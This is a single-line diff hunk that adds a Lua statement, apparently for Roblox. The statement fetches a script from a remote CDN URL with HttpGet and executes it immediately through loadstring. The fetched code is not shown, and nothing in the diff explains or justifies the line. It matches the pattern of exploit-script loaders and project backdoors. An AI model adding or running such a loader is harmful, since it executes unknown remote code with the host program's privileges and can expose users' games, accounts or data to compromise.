@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://cdn.luaprotect.dev/u/8e96d1/ZCm76GVNvYMGjTnG"))()
